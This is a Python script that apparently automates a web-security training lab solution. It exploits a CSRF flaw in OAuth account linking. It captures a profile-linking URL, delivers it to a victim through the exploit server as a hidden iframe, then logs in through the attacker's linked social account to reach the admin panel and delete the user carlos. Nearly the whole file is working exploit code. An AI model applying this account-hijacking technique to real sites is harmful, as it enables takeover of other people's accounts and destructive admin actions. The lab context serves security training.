import requests
import re
import time
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.exploit_server_url = None
        self.session = requests.Session()
        self.my_account_username = 'wiener'
        self.my_account_password = 'peter'
        self.my_social_media_account_username = 'peter.wiener'
        self.my_social_media_account_password = 'hotdog'
        self.link_profile_url = None
        self.oauth_service_api_url = None
        self.user_login_and_consent_url = None
        self.csrf_link_profile_url = None
        self.session2 = requests.Session()
        self.request_authorization_url = None
        self.oauth_token = None

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('value="(.*)"', response.text).group(1)

    def sign_in_as_my_account(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': self.my_account_username,
            'password': self.my_account_password
        }
        response = self.session.post(self.lab_url + 'login', data=data)
        self.exploit_server_url = re.findall('<a id=\'exploit-link\' class=\'button\' target=\'_blank\' '
                                             'href=\'(.*)\'>', response.text)[0] + '/'
        self.link_profile_url = re.findall('<a href=\'(https://.*)\'', response.text)[0]
        self.oauth_service_api_url = self.link_profile_url.split('/auth')[0] + '/'

    def link_profile(self):
        response = self.session.get(self.link_profile_url)
        self.user_login_and_consent_url = re.findall('<form autocomplete="off" action="(.*?)"', response.text)[0]

    def login_and_consent_and_access_granted_token_for_linking_account(self):
        data = {
            'username': self.my_social_media_account_username,
            'password': self.my_social_media_account_password
        }
        response = self.session.post(self.oauth_service_api_url + self.user_login_and_consent_url.lstrip('/'),
                                     data=data)
        continue_url = re.findall('<form autocomplete="off" action="(.*?)"', response.text)[0]
        response = self.session.post(self.oauth_service_api_url + continue_url.lstrip('/'), allow_redirects=False)
        response = self.session.get(response.headers.get('Location'), allow_redirects=False)
        self.csrf_link_profile_url = re.findall('<a href="(https://.*)?">', response.text)[0]

    def delete_victim(self):
        self.session2.get(self.lab_url + 'admin/delete?username=carlos')

    def deliver_exploit(self):
        data = {
            'urlIsHttps': 'on',
            'responseFile': '/exploit',
            'responseHead': 'HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8',
            'responseBody': '',
            'formAction': 'DELIVER_TO_VICTIM'
        }
        response_body = '<iframe src="{}"></iframe>'.format(self.csrf_link_profile_url)
        data['responseBody'] = response_body
        self.session.post(self.exploit_server_url, data=data)

    def request_authorization(self):
        response = self.session2.get(self.lab_url + 'login')
        self.request_authorization_url = re.findall('href=\'(https://oauth-.*)\'>', response.text)[0]
        response = self.session2.get(self.request_authorization_url)
        self.user_login_and_consent_url = re.findall('<form autocomplete="off" action="(.*?)"', response.text)[0]

    def login_and_consent_and_access_granted_token_for_login(self):
        data = {
            'username': self.my_social_media_account_username,
            'password': self.my_social_media_account_password
        }
        response = self.session2.post(self.oauth_service_api_url + self.user_login_and_consent_url.lstrip('/'),
                                      data=data)
        continue_url = re.findall('<form autocomplete="off" action="(.*?)"', response.text)[0]
        self.session2.post(self.oauth_service_api_url + continue_url.lstrip('/'))
        self.session2.get(self.lab_url + 'my-account')

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.sign_in_as_my_account()
        self.link_profile()
        self.login_and_consent_and_access_granted_token_for_linking_account()
        self.deliver_exploit()
        time.sleep(5)
        self.request_authorization()
        self.login_and_consent_and_access_granted_token_for_login()
        self.delete_victim()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
